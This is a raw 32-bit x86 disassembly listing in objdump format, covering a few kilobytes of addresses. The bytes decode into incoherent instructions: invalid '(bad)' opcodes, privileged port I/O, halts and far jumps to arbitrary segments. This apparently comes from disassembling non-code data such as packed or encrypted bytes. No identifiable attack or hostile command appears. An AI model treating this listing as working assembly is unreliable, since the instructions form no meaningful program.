  443ef0:	mov    BYTE PTR [ebx],bh
  443ef2:	add    eax,0xc4f404a9
  443ef7:	pop    ds
  443ef8:	shr    DWORD PTR [edx-0x59],1
  443efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443efc:	dec    eax
  443efd:	cmp    BYTE PTR [eax],bh
  443eff:	stos   DWORD PTR es:[edi],eax
  443f00:	dec    eax
  443f01:	xor    BYTE PTR [eax],bh
  443f03:	sbb    al,0xb3
  443f05:	lds    esi,FWORD PTR [ebp+0x7e186865]
  443f0b:	mov    ebx,0xab7e0c1f
  443f10:	pop    ds
  443f11:	add    BYTE PTR [esi-0x5b],bh
  443f14:	(bad)  [eax+0x6e]
  443f17:	pop    ebx
  443f18:	add    al,0xf4
  443f1a:	add    al,0xfe
  443f1c:	inc    esi
  443f1d:	jno    0x443ee5
  443f1f:	repnz mov cs,edx
  443f22:	enter  0xb4ff,0xf2
  443f26:	mov    ebp,esp
  443f28:	jmp    0x443f6c
  443f2a:	mov    bl,ch
  443f2c:	stc    
  443f2d:	cli    
  443f2e:	sub    al,0x87
  443f30:	std    
  443f31:	jecxz  0x443fb2
  443f33:	jle    0x443fae
	...
  443f4d:	add    al,dh
  443f4f:	add    al,0x0
  443f51:	bound  esi,QWORD PTR [edx-0x33decb2c]
  443f57:	dec    edx
  443f58:	xchg   BYTE PTR [ecx],ah
  443f5a:	jno    0x443f05
  443f5c:	and    edx,ecx
  443f5e:	push   0xffffffd7
  443f60:	aaa    
  443f61:	pusha  
  443f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443f63:	and    al,0x4
  443f65:	jb     0x443f40
  443f67:	fmul   QWORD PTR [edx-0x78fb1aa3]
  443f6d:	push   ebp
  443f6e:	adc    al,0x25
  443f70:	test   DWORD PTR [esi-0x3682d2ba],esp
  443f76:	bnd jg 0x443fbd
  443f79:	add    eax,0x53e81a4
  443f7e:	int    0x2
  443f80:	(bad)  
  443f81:	call   0x272c617d
  443f86:	repnz sbb ebx,ebp
  443f89:	jb     0x443f44
  443f8b:	rol    BYTE PTR [esi-0x3172bd3],1
  443f91:	cwde   
  443f92:	adc    cl,0x23
  443f95:	icebp  
  443f96:	(bad)  
  443f97:	xchg   ebp,eax
  443f98:	sbb    DWORD PTR [eax-0x55],esi
  443f9b:	and    al,0x10
  443f9d:	out    0x86,al
  443f9f:	test   eax,0xa9806e37
  443fa4:	and    esi,ebp
  443fa6:	jp     0x443f77
  443fa8:	aas    
  443fa9:	jb     0x443ffe
  443fab:	and    al,0xe5
  443fad:	hlt    
  443fae:	ins    BYTE PTR es:[edi],dx
  443faf:	sar    bh,0x9
	...
  443fca:	add    dl,al
  443fcc:	std    
  443fcd:	mov    al,0x0
  443fcf:	and    DWORD PTR [ebx],edi
  443fd1:	xor    al,0xcd
  443fd3:	adc    al,BYTE PTR [esi+0x40d00e0]
  443fd9:	jns    0x443fc5
  443fdb:	sbb    eax,0x2fff904
  443fe0:	jl     0x443fb6
  443fe2:	add    BYTE PTR ds:0x49b70704,cl
  443fe8:	icebp  
  443fe9:	idiv   BYTE PTR [ebx]
  443feb:	push   ds
  443fec:	xor    eax,0xe7998bd6
  443ff1:	add    ecx,DWORD PTR [edi]
  443ff3:	sub    cl,BYTE PTR [eax-0x6]
  443ff6:	cmp    cl,BYTE PTR [ecx-0xd8af019]
  443ffc:	js     0x444012
  443ffe:	and    al,0x46
  444000:	xor    eax,0x2d46041d
  444005:	sbb    eax,0x82b2ce20
  44400a:	inc    esp
  44400b:	stc    
  44400c:	push   esp
  44400d:	mov    bl,0xf8
  44400f:	mov    bl,0xad
  444011:	test   BYTE PTR [ebp+0x107e921],0x8d
  444018:	add    eax,DWORD PTR [ebp-0x704724c]
  44401e:	call   FWORD PTR [ebp-0x61cdfb88]
  444024:	inc    edi
  444025:	xor    esi,DWORD PTR [ebp+0x79]
  444028:	js     0x44406e
  44402a:	xor    bl,BYTE PTR [ecx-0x10]
  44402d:	inc    ebx
  44402e:	cmp    al,BYTE PTR [eax]
	...
  444048:	pop    ecx
  444049:	add    BYTE PTR ss:[ebx-0x16930771],al
  444050:	jbe    0x444085
  444052:	jl     0x444016
  444054:	pop    ecx
  444055:	call   0x66d:0x35dfff7
  44405c:	into   
  44405d:	mov    esi,0xc5f4c0f9
  444062:	repz sub esi,ebp
  444065:	fidiv  DWORD PTR [ecx]
  444067:	add    BYTE PTR [ecx+0x59],bh
  44406a:	sbb    eax,DWORD PTR [ebp+0x252401a0]
  444070:	xor    edx,DWORD PTR [eax+0x3]
  444073:	call   DWORD PTR [ebx]
  444075:	pop    ebp
  444076:	ror    BYTE PTR [ebx+0x7f],cl
  444079:	mov    DWORD PTR [ecx],ebx
  44407b:	cmp    BYTE PTR [edi-0x77],ch
  44407e:	sbb    DWORD PTR [edi+edi*4],ebx
  444081:	sbb    dl,bh
  444083:	or     al,0x7f
  444085:	jo     0x4440a0
  444087:	or     BYTE PTR [edi-0x7e],bh
  44408a:	mov    ebp,0x1404084
  44408f:	test   DWORD PTR [eax],eax
  444091:	cmp    BYTE PTR [esi+0x4a],ah
  444094:	rcl    DWORD PTR [edi+0x58],cl
  444097:	test   DWORD PTR [eax],ebp
  444099:	clc    
  44409a:	sti    
  44409b:	xchg   BYTE PTR [eax],bh
  44409d:	add    al,bh
  44409f:	xchg   BYTE PTR [esi],ch
  4440a1:	lods   al,BYTE PTR ds:[esi]
  4440a2:	sbb    bh,BYTE PTR [ebp+0x748c4931]
  4440a8:	rcl    BYTE PTR [edi+0x4],1
  4440ab:	lock add BYTE PTR [eax],al
	...
  4440c2:	add    BYTE PTR [eax],al
  4440c4:	add    BYTE PTR [ebp+0x10],ch
  4440c7:	and    BYTE PTR [eax],cl
  4440c9:	jmp    0x444091
  4440cb:	mov    al,0x37
  4440cd:	xchg   ebx,eax
  4440ce:	jecxz  0x4440aa
  4440d0:	aas    
  4440d1:	jge    0x444093
  4440d3:	pop    ds
  4440d4:	or     al,0x6f
  4440d6:	push   eax
  4440d7:	sbb    edi,esp
  4440d9:	aad    0x6e
  4440db:	pop    eax
  4440dc:	stc    
  4440dd:	jg     0x4440ef
  4440df:	and    BYTE PTR [eax],bh
  4440e1:	xor    ebx,DWORD PTR [eax]
  4440e3:	and    BYTE PTR [esi+esi*8],bl
  4440e6:	pop    esp
  4440e7:	std    
  4440e8:	jmp    FWORD PTR [ebp+0x22]
  4440eb:	aam    0x84
  4440ed:	test   al,0x3f
  4440ef:	adc    eax,0xb04a885
  4440f4:	clc    
  4440f5:	js     0x4440ba
  4440f7:	rcr    BYTE PTR [esp+ebx*1],cl
  4440fa:	(bad)  
  4440fb:	in     al,0x8c
  4440fd:	jno    0x444081
  4440ff:	and    ebx,DWORD PTR [edi]
  444101:	shl    DWORD PTR [esi+0x4260b6a1],0x2b
  444108:	inc    edi
  444109:	sub    BYTE PTR [ecx],bh
  44410b:	out    0x86,eax
  44410d:	mov    ebx,0xb386e704
  444112:	add    al,0xe7
  444114:	xchg   BYTE PTR [ebx-0x4c7918fc],bh
  44411a:	add    al,0xe7
  44411c:	add    esi,esp
  44411e:	add    al,0xe8
  444120:	add    esi,esp
  444122:	add    al,0xe6
  444124:	add    esi,esp
  444126:	add    al,0xe2
  444128:	add    eax,DWORD PTR [eax]
	...
  444142:	hlt    
  444143:	add    al,0xe2
  444145:	add    esi,esp
  444147:	add    al,0xca
  444149:	add    esi,esp
  44414b:	add    al,0x22
  44414d:	add    al,0xf4
  44414f:	add    al,0x5a
  444151:	add    al,0xf4
  444153:	add    al,0xd2
  444155:	add    al,0xf4
  444157:	add    al,0xca
  444159:	add    eax,0x3c204f4
  44415e:	hlt    
  44415f:	add    al,0xba
  444161:	call   FWORD PTR [ebx-0xbf84dbb]
  444167:	add    al,0xaa
  444169:	test   DWORD PTR [ebx-0xbe85dbb],0x7bd79a04
  444173:	inc    ebp
  444174:	xchg   edx,eax
  444175:	push   edi
  444176:	hlt    
  444177:	add    al,0x8a
  444179:	push   edi
  44417a:	imul   eax,DWORD PTR [ebp-0x7e],0x57
  44417e:	popa   
  44417f:	inc    ebp
  444180:	jp     0x4441d9
  444182:	cmc    
  444183:	add    al,0x0
  444185:	jbe    0x444132
  444187:	sti    
  444188:	jmp    FWORD PTR [ebp-0x5d]
  44418b:	jmp    0x44418c
  44418d:	gs stos DWORD PTR es:[edi],eax
  44418f:	or     eax,DWORD PTR [eax]
  444191:	pop    esi
  444192:	mov    ds:0xcb55ffcb,eax
  444197:	dec    ebx
  444198:	add    BYTE PTR [esi-0x3d],cl
  44419b:	dec    ebx
  44419c:	inc    DWORD PTR [ebp-0x35]
  44419f:	dec    ebx
  4441a0:	std    
  4441a1:	cmp    eax,0x36014bc3
	...
  4441be:	add    BYTE PTR [ebx-0x5cd1f6b5],ch
  4441c4:	dec    ebx
  4441c5:	sbb    DWORD PTR [esi],esp
  4441c7:	stos   DWORD PTR es:[edi],eax
  4441c8:	dec    ebx
  4441c9:	cmp    DWORD PTR [esi],ebx
  4441cb:	mov    ds:0x4b16794b,eax
  4441d0:	ds stc 
  4441d2:	mov    dh,0x99
  4441d4:	xlat   BYTE PTR ds:[ebx]
  4441d5:	dec    esp
  4441d6:	gs ja  0x44420a
  4441d9:	inc    eax
  4441da:	std    
  4441db:	outs   dx,BYTE PTR ds:[esi]
  4441dc:	mov    ecx,0xbf7e9123
  4441e1:	sbb    esp,DWORD PTR [edx-0x66]
  4441e4:	or     BYTE PTR [ebp+0x7d54f6ef],al
  4441ea:	shr    esi,cl
  4441ec:	mov    eax,DWORD PTR [ebp+ecx*1-0x24]
  4441f0:	mov    edx,DWORD PTR [ebp+eax*1-0x5c]
  4441f4:	mov    DWORD PTR [ebp+ecx*1+0x5c],ebp
  4441f8:	mov    DWORD PTR [edx-0x27],ecx
  4441fb:	outs   dx,BYTE PTR ds:[esi]
  4441fc:	fisttp WORD PTR [ebx]
  4441fe:	add    ah,BYTE PTR [ecx]
  444200:	ss fucomi st,st(2)
  444203:	push   ds
  444204:	(bad)  
  444205:	out    0xe8,al
  444207:	clc    
  444208:	add    al,0x0
  44420a:	jmp    0x8c0b:0xcd5c8c2e
  444211:	ins    BYTE PTR es:[edi],dx
  444212:	lds    ebx,FWORD PTR [edi]
  444214:	mov    WORD PTR [eax+eax*1+0x31],cs
  444218:	cmp    BYTE PTR [edi+eax*2+0x50479009],al
  44421f:	aam    0x83
  444221:	sbb    eax,0x8
	...
  44423a:	add    BYTE PTR [eax],al
  44423c:	aam    0x4b
  44423e:	sbb    eax,0x9950c
  444243:	add    BYTE PTR [ebp-0x71],cl
  444246:	inc    edi
  444247:	push   esp
  444248:	out    dx,al
  444249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44424a:	inc    edi
  44424b:	mov    DWORD PTR [ecx],edx
  44424d:	and    al,0xb8
  44424f:	add    DWORD PTR ds:0x4a8b0008,ecx
  444255:	or     ah,0xe0
  444258:	push   ebp
  444259:	xchg   ecx,eax
  44425a:	inc    esp
  44425b:	and    al,0x11
  44425d:	(bad)  
  44425e:	aas    
  44425f:	sub    BYTE PTR [esi+0x428b294a],al
  444265:	adc    al,0x81
  444267:	inc    esp
  444268:	rcl    DWORD PTR [ebx],0x81
  44426b:	dec    esp
  44426c:	mov    cl,0x17
  44426e:	adc    DWORD PTR [ecx+esi*4+0x1f],0x8eb56f83
  444276:	push   edi
  444277:	cmp    al,0x56
  444279:	push   esp
  44427a:	sbb    eax,0x1d4c562c
  44427f:	adc    al,0x16
  444281:	retf   
  444282:	outs   dx,BYTE PTR ds:[esi]
  444283:	and    cl,BYTE PTR [esi-0x38]
  444286:	add    ch,BYTE PTR [ebx]
  444288:	pop    ebx
  444289:	mov    al,ds:0x79d000c
  44428e:	and    eax,ecx
  444290:	sub    BYTE PTR [ebp+0x1d],bl
  444293:	sbb    al,0x5e
  444295:	fs or  eax,0xffffff8e
  444299:	(bad)  
  44429a:	jmp    0x1c:0x1d5528aa
	...
  4442b9:	add    al,0x55
  4442bb:	sbb    eax,0xf0406614
  4442c0:	(bad)  
  4442c1:	hlt    
  4442c2:	cs std 
  4442c4:	push   esp
  4442c6:	sbb    esp,esi
  4442c8:	sub    al,0x34
  4442ca:	mov    bh,0xf9
  4442cc:	inc    ecx
  4442cd:	outs   dx,DWORD PTR ds:[esi]
  4442ce:	jbe    0x44434f
  4442d0:	mov    ebp,0x5649efc
  4442d5:	pop    esp
  4442d6:	xchg   BYTE PTR [ebp+eax*4-0x40],ch
  4442da:	adc    DWORD PTR [eax],ebx
  4442dc:	jge    0x4442d7
  4442de:	ins    DWORD PTR es:[edi],dx
  4442df:	cmp    eax,0x42ff43d
  4442e4:	test   BYTE PTR [ebp+0x2f],bh
  4442e7:	std    
  4442e8:	jmp    FWORD PTR [ebx-0x3ab352aa]
  4442ee:	lahf   
  4442ef:	jno    0x444276
  4442f1:	clc    
  4442f2:	adc    DWORD PTR [ebp+0x34],edi
  4442f5:	shr    BYTE PTR ds:0x88f41ffd,1
  4442fb:	js     0x444353
  4442fd:	(bad)  
  4442fe:	std    
  4442ff:	iret   
  444300:	inc    ebx
  444301:	daa    
  444302:	in     al,dx
  444303:	add    bl,BYTE PTR [esi+0x62bb1775]
  444309:	push   edx
  44430a:	ror    ecx,0x37
  44430d:	jne    0x444314
  44430f:	loop   0x444384
  444311:	pop    ecx
  444312:	mov    dl,cl
  444314:	das    
  444315:	jne    0x44434d
  444317:	out    0x69,al
  444319:	pop    ecx
  44431a:	cmc    
  44431b:	enter  0x27,0x0
	...
  444333:	add    BYTE PTR [eax],al
  444335:	add    BYTE PTR [ebp+ebp*1-0x3],bh
  444339:	push   esp
  44433b:	sub    bl,BYTE PTR [edi-0x7fdb6341]
  444341:	loopne 0x444336
  444343:	scas   al,BYTE PTR es:[edi]
  444344:	push   esp
  444345:	add    ah,BYTE PTR [ecx]
  444347:	pop    edx
  444348:	dec    esp
  444349:	mov    esi,0x7d2bf4
  44434e:	add    DWORD PTR [esi],ebp
  444350:	push   0xec05bb0c
  444355:	ret    
  444356:	cmp    eax,esi
  444358:	out    0x1,al
  44435a:	hlt    
  44435b:	add    al,0xe7
  44435d:	push   0xc3e449f2
  444362:	mov    ds:0xf400e6c6,eax
  444367:	add    al,0xe7
  444369:	mov    ecx,0x690eddaa
  44436e:	jne    0x444305
  444370:	addr16 pop eax
  444372:	in     eax,dx
  444373:	mov    ecx,0xab3410f3
  444378:	mov    ecx,DWORD PTR [ecx-0xcd97ac7]
  44437e:	cmp    BYTE PTR ds:0x19796bde,ah
  444384:	or     ecx,DWORD PTR [ecx+0x20eee8a8]
  44438a:	daa    
  44438b:	mov    gs,ebx
  44438d:	jb     0x444401
  44438f:	push   ecx
  444390:	std    
  444391:	aaa    
  444392:	xor    DWORD PTR [eax],esi
  444394:	imul   eax,DWORD PTR [ebx-0x79],0x1b
  444398:	sub    BYTE PTR [ebx+0x0],ch
	...
  4443b3:	add    al,0x6f
  4443b5:	rcl    bh,1
  4443b7:	pop    ss
  4443b8:	adc    eax,0x9427dda
  4443bd:	out    0x3,eax
  4443bf:	and    edi,DWORD PTR [ecx+0x4944efc2]
  4443c5:	add    BYTE PTR [edi+esi*8-0x5b7718fc],ch
  4443cc:	inc    ebx
  4443cd:	int    0xf4
  4443cf:	jno    0x44441d
  4443d1:	(bad)  
  4443d2:	hlt    
  4443d3:	cld    
  4443d4:	mov    bl,bl
  4443d6:	add    al,0xf4
  4443d8:	add    al,0x67
  4443da:	gs in  eax,dx
  4443dc:	mov    eax,0xb5c30e0b
  4443e1:	xlat   BYTE PTR ds:[ebx]
  4443e2:	jge    0x44437f
  4443e4:	cmc    
  4443e5:	jmp    FWORD PTR [eax-0x5d799162]
  4443eb:	js     0x44446c
  4443ed:	adc    BYTE PTR [edx+0x73e80810],bh
  4443f3:	mov    ch,0x7c
  4443f5:	(bad)  
  4443f6:	call   0x8a1148f2
  4443fb:	mov    al,ds:0xaccad6e7
  444400:	dec    edi
  444401:	jmp    0x4443ed
  444403:	pop    es
  444404:	mov    dl,BYTE PTR [ebp+ecx*8+0x5f]
  444408:	shl    esp,0xde
  44440b:	push   ds
  44440c:	push   cs
  44440d:	sub    eax,0x866e4e29
  444412:	xor    bh,BYTE PTR [eax+0x7f]
  444415:	adc    BYTE PTR [edx],bh
	...
  44442f:	add    BYTE PTR [eax+0x5c62e807],dl
  444435:	in     eax,0x3
  444437:	jb     0x44446d
  444439:	in     eax,0xb
  44443b:	or     cl,ch
  44443d:	xchg   DWORD PTR [eax+ebx*2],eax
  444440:	mov    edx,DWORD PTR [edi+edi*4+0x43]
  444444:	or     BYTE PTR [edi+0x4fcbd3cc],al
  44444a:	jmp    0x4444bf
  44444c:	xor    BYTE PTR [ebp+0x10],ch
  44444f:	out    0x73,al
  444451:	outs   dx,DWORD PTR ds:[esi]
  444452:	add    cl,ch
  444454:	test   DWORD PTR [edi+ebx*8+0x35a3c3f6],0x860fab20
  44445f:	add    bl,ah
  444461:	inc    esp
  444462:	bound  edi,QWORD PTR [edx+eax*2]
  444465:	dec    edx
  444466:	sub    BYTE PTR [edx-0xd1fae39],0x4f
  44446d:	xchg   ebx,ecx
  44446f:	xchg   ecx,eax
  444470:	lock add al,0x0
  444473:	jmp    0x8c6962
  444478:	pop    es
  444479:	repnz sbb al,ch
  44447c:	outs   dx,BYTE PTR ds:[esi]
  44447d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44447e:	cli    
  44447f:	iret   
  444480:	mov    dh,0x4
  444482:	xor    DWORD PTR [ecx+edi*8-0x1c],0x48a6c782
  44448a:	sbb    eax,0x6ca5628
  44448f:	sub    cl,0x3
	...
  4444aa:	add    BYTE PTR [eax],al
  4444ac:	add    dh,dl
  4444ae:	jg     0x4444cd
  4444b0:	sbb    dh,ah
  4444b2:	fisub  DWORD PTR [edx]
  4444b4:	repnz fsubrp st(0),st
  4444b7:	cli    
  4444b8:	mov    DWORD PTR [ebx-0x44],ebx
  4444bb:	dec    BYTE PTR [ecx+0x56820a1b]
  4444c1:	dec    edi
  4444c2:	xchg   DWORD PTR [esi-0x5b55afd],edi
  4444c8:	xchg   DWORD PTR [edx+0xa],ebp
  4444cb:	jnp    0x444494
  4444cd:	push   cs
  4444ce:	xlat   BYTE PTR ds:[ebx]
  4444cf:	mov    ds:0x2be8598b,eax
  4444d4:	jmp    0x3b1806
  4444d9:	sahf   
  4444da:	sar    eax,1
  4444dc:	je     0x44446e
  4444de:	adc    BYTE PTR [esp+0x25],bh
  4444e2:	pop    eax
  4444e3:	mov    al,0x4f
  4444e5:	data16 sbb BYTE PTR ds:0x7b0b5718,0xe9
  4444ed:	into   
  4444ee:	mov    ebx,0x4b65013e
  4444f3:	sti    
  4444f4:	xchg   DWORD PTR [edx-0x263884fa],ebx
  4444fa:	(bad)  
  4444fb:	mov    eax,ds:0xf6d5f5e9
  444500:	jmp    DWORD PTR [ebp+0x48]
  444503:	or     BYTE PTR [ebp+0x8a3],al
  444509:	hlt    
  44450a:	xchg   ebp,eax
  44450b:	std    
  44450c:	push   esp
  44450e:	sub    eax,0xe034
	...
  444527:	add    BYTE PTR [eax],al
  444529:	add    BYTE PTR [ebx+ecx*1],ch
  44452c:	inc    ecx
  44452d:	std    
  44452e:	mov    ch,0xb2
  444530:	mov    bh,0x23
  444532:	cld    
  444533:	mov    ds:0xb38d7e07,al
  444538:	dec    ebp
  444539:	stc    
  44453a:	jnp    0x444511
  44453c:	ret    
  44453d:	or     BYTE PTR [ecx-0x75],bh
  444540:	add    al,BYTE PTR [eax]
  444542:	hlt    
  444543:	aad    0xfc
  444545:	push   esp
  444547:	sub    eax,0x4aace034
  44454c:	inc    edx
  44454d:	std    
  44454e:	xor    eax,0xf823b7b2
  444553:	mov    ds:0x544d7e07,al
  444558:	push   eax
  444559:	stc    
  44455a:	cmp    esi,DWORD PTR [edx+0x9b8853b]
  444560:	sbb    cl,dh
  444562:	dec    ebp
  444563:	mov    ds:0x12dc23d7,al
  444568:	inc    edx
  444569:	or     DWORD PTR [esi-0x19],esi
  44456c:	add    DWORD PTR [eax],eax
  44456e:	hlt    
  44456f:	sub    bh,BYTE PTR [ebx]
  444571:	jge    0x4444fb
  444573:	adc    DWORD PTR [eax+eax*1],edx
  444576:	mov    DWORD PTR [ecx],ecx
  444578:	sbb    edi,DWORD PTR [edi+0x447b1df7]
  44457e:	sbb    BYTE PTR [ebx+ecx*1],al
  444581:	mov    edi,0xbf1c8c62
  444586:	out    0xc8,eax
  444588:	jp     0x44457b
  44458a:	(bad)  
  44458d:	push   edx
	...
  4445a6:	add    BYTE PTR [edi],cl
  4445a8:	in     eax,dx
  4445a9:	aad    0x4d
  4445ab:	pop    ds
  4445ac:	in     eax,dx
  4445ad:	push   edx
  4445ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4445af:	outs   dx,DWORD PTR ds:[esi]
  4445b0:	aaa    
  4445b1:	sbb    al,0xee
  4445b3:	iret   
  4445b4:	add    eax,0xe9387d2f
  4445b9:	push   ss
  4445ba:	or     eax,0x502b7bc
  4445bf:	sub    cl,ch
  4445c1:	adc    al,BYTE PTR ds:0x1cb7eaa4
  4445c7:	mov    esp,0xec28238a
  4445cc:	stc    
  4445cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445ce:	fxch   st(5)
  4445d0:	jmp    0x8a949a7c
  4445d5:	sbb    ebp,DWORD PTR [eax]
  4445d7:	sub    al,0x8a
  4445d9:	sub    ebp,DWORD PTR [eax]
  4445db:	and    al,0xfa
  4445dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445de:	fscale 
  4445e0:	jmp    0x8ad49a8c
  4445e5:	jp     0x444603
  4445e7:	bound  ebp,QWORD PTR [edx]
  4445e9:	rol    DWORD PTR [esp+eax*2],cl
  4445ec:	jmp    0xcce:0xe8b87c77
  4445f3:	jnp    0x4445ac
  4445f5:	out    dx,al
  4445f6:	sbb    al,0x73
  4445f8:	xor    al,BYTE PTR [ebx+0x54ea257c]
  4445fe:	jl     0x44462c
  444600:	xor    al,BYTE PTR [ebx+0x12e8a07c]
  444606:	pop    ebx
  444607:	add    bh,BYTE PTR [edi]
  444609:	cmp    dl,BYTE PTR [eax+0x0]
	...
  444624:	jno    0x444664
  444626:	loop   0x444600
  444628:	in     al,dx
  444629:	scas   al,BYTE PTR es:[edi]
  44462a:	and    edi,DWORD PTR [ecx+edx*1+0xe]
  44462e:	xchg   ecx,eax
  44462f:	daa    
  444630:	sbb    BYTE PTR [esi],cl
  444632:	call   0xf827:0x82aefd64
  444639:	or     eax,0x2ded5d8a
  44463e:	xor    BYTE PTR [eax+esi*1-0x17],bh
  444642:	out    dx,al
  444643:	pop    esp
  444644:	retf   
  444645:	lea    eax,[eax]
  444647:	out    0x8,al
  444649:	jle    0x4446c8
  44464b:	in     al,dx
  44464c:	push   ss
  44464d:	mov    ah,0xd
  44464f:	not    cl
  444651:	xor    cl,BYTE PTR [ecx]
  444653:	dec    edi
  444654:	cli    
  444655:	mov    edi,0x30a2edc1
  44465a:	cli    
  44465b:	push   0x2d
  44465d:	in     eax,0x8
  44465f:	sar    BYTE PTR [ebx],cl
  444661:	or     al,0xd5
  444663:	leave  
  444664:	mov    edi,DWORD PTR [ebx+0x59b2e6df]
  44466a:	test   ebp,esp
  44466c:	jbe    0x444679
  44466e:	mov    dl,0xb5
  444670:	jae    0x44461d
  444672:	(bad)  
  444673:	ror    al,cl
  444675:	mov    al,al
  444677:	sbb    al,0x51
  444679:	jle    0x444663
  44467b:	stc    
  44467c:	jge    0x444673
  44467e:	jnp    0x44464d
  444680:	inc    edi
  444681:	or     al,0x82
  444683:	(bad)  
  444685:	add    al,0x0
  444687:	mov    al,0x0
	...
  4446a1:	sub    esp,ecx
  4446a3:	adc    esi,esi
  4446a5:	ins    DWORD PTR es:[edi],dx
  4446a6:	and    eax,0x4f7eb0f
  4446ab:	test   DWORD PTR [ecx],edi
  4446ad:	mov    cl,0x26
  4446af:	adc    BYTE PTR [ecx+0x49840c28],al
  4446b5:	lock add al,0x0
  4446b8:	push   0xffffff98
  4446ba:	or     esi,DWORD PTR [ebp+edx*8+0xa]
  4446be:	push   eax
  4446bf:	mov    edi,0x94521e6
  4446c4:	scas   eax,DWORD PTR es:[edi]
  4446c5:	mov    al,0xe7
  4446c7:	out    0xca,eax
  4446c9:	xrelease xchg DWORD PTR [eax],eax
  4446cc:	mov    edi,0x37fe3cb6
  4446d1:	jecxz  0x44471c
  4446d3:	mov    edi,0x70e5456a
  4446d8:	add    BYTE PTR [edi-0x250a98c5],ch
  4446de:	pop    edx
  4446df:	aaa    
  4446e0:	adc    DWORD PTR [ebx],0xd
  4446e3:	pop    es
  4446e4:	repz retf 
  4446e6:	xchg   DWORD PTR [ebp-0x412055e0],edi
  4446ec:	mov    ebp,ecx
  4446ee:	in     al,dx
  4446ef:	or     ecx,DWORD PTR [edi]
  4446f1:	data16 loopne 0x4446fa
  4446f4:	jle    0x4446ab
  4446f6:	cmp    edi,DWORD PTR [eax-0x2b]
  4446f9:	push   es
  4446fa:	add    al,0x7b
  4446fc:	lsl    edi,sp
  4446ff:	sbb    al,0x4c
  444702:	fisttp WORD PTR [edi]
  444704:	sub    eax,DWORD PTR [eax]
	...
  44471e:	mov    ah,0x3b
  444720:	addr16 leave 
  444722:	lds    esi,FWORD PTR [edi]
  444724:	or     BYTE PTR [ecx+edi*4-0x31fffff9],al
  44472b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44472c:	push   es
  44472d:	je     0x444751
  44472f:	cmp    al,0xcc
  444731:	ror    DWORD PTR [edx+0x5a],0xc1
  444735:	cmovnp eax,ecx
  444738:	and    ch,al
  44473a:	cs cmp al,0x7e
  44473d:	add    bl,ch
  44473f:	inc    edi
  444740:	stc    
  444741:	add    dh,BYTE PTR [eax+edi*4-0x4006db8d]
  444748:	mov    esi,0x27e4512b
  44474d:	cmp    ecx,esi
  44474f:	cmp    bh,BYTE PTR [ebx-0x57]
  444752:	sbb    eax,0xc78b0008
  444757:	mov    esi,0x86be2bee
  44475c:	loope  0x444761
  44475e:	xchg   edi,eax
  44475f:	add    DWORD PTR [eax-0x5bd98f9],ecx
  444765:	mov    DWORD PTR [ebx-0xb3984fb],esp
  44476b:	cs jne 0x4447af
  44476e:	cmc    
  44476f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444770:	mov    cl,0xfd
  444772:	jbe    0x44475e
  444774:	std    
  444775:	in     al,dx
  444776:	nop
  444777:	mov    dh,0xd0
  444779:	and    edx,DWORD PTR [eax]
  44477b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44477c:	test   al,0x23
  44477e:	in     al,dx
  44477f:	add    al,0x20
  444781:	stc    
	...
  44479a:	add    BYTE PTR [ebx-0xbb886de],dh
  4447a0:	scas   al,BYTE PTR es:[edi]
  4447a1:	inc    esi
  4447a2:	jmp    FWORD PTR [eax]
  4447a4:	xchg   esi,eax
  4447a5:	add    eax,0xd805d07c
  4447aa:	lods   eax,DWORD PTR ds:[esi]
  4447ab:	inc    ebx
  4447ac:	mov    bh,0x35
  4447ae:	xchg   bl,dh
  4447b0:	scas   al,BYTE PTR es:[edi]
  4447b1:	push   esp
  4447b2:	std    
  4447b3:	jnp    0x44479f
  4447b5:	cld    
  4447b6:	xchg   DWORD PTR [ebx],esi
  4447b8:	xor    BYTE PTR [ebp+0x41],dh
  4447bb:	imul   DWORD PTR [esi-0x2898fbbe]
  4447c1:	jbe    0x44481f
  4447c3:	sbb    BYTE PTR [esi],ah
  4447c5:	push   esi
  4447c6:	add    BYTE PTR [ebx-0x76],bl
  4447c9:	dec    ebx
  4447ca:	test   DWORD PTR [ebx-0x2b],edx
  4447cd:	ret    
  4447ce:	or     BYTE PTR [ecx-0x65],dh
  4447d1:	add    al,0x0
  4447d3:	hlt    
  4447d4:	scas   al,BYTE PTR es:[edi]
  4447d5:	arpl   WORD PTR [ecx],cx
  4447d7:	jmp    0x444777
  4447d9:	cmp    eax,0x1eecb209
  4447de:	or     al,0x71
  4447e0:	sub    eax,0x2ef43cab
  4447e5:	aaa    
  4447e6:	test   eax,esi
  4447e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4447e9:	push   esp
  4447ea:	int3   
  4447eb:	adc    al,dl
  4447ed:	dec    edx
  4447ee:	test   DWORD PTR [ebx],ecx
  4447f0:	xchg   ebp,eax
  4447f1:	les    ecx,FWORD PTR [eax]
  4447f3:	jns    0x444778
  4447f5:	add    al,0x0
  4447f7:	hlt    
  4447f8:	scas   al,BYTE PTR es:[edi]
  4447f9:	arpl   WORD PTR [ecx],cx
  4447fb:	add    eax,DWORD PTR ds:0x4336
	...
  444815:	add    BYTE PTR [eax],al
  444817:	add    ch,bh
  444819:	mov    edx,0x7ff02127
  44481e:	out    0xad,eax
  444820:	sbb    BYTE PTR ds:0x917c85e,al
  444826:	out    0x38,al
  444828:	jno    0x44482b
  44482a:	outs   dx,DWORD PTR ds:[esi]
  44482b:	pop    ebx
  44482c:	jmp    0x444867
  44482e:	repnz dec esp
  444830:	jno    0x44486c
  444832:	pop    esi
  444833:	cmp    al,0x79
  444835:	ror    DWORD PTR [edx],0x18
  444838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444839:	pop    esp
  44483a:	outs   dx,BYTE PTR ds:[esi]
  44483b:	xlat   BYTE PTR ds:[ebx]
  44483c:	xlat   BYTE PTR ds:[ebx]
  44483d:	cld    
  44483e:	or     eax,0x8586ed41
  444843:	add    esi,esp
  444845:	add    al,0xe6
  444847:	cmp    BYTE PTR [ecx],cl
  444849:	mov    ecx,0xaff41402
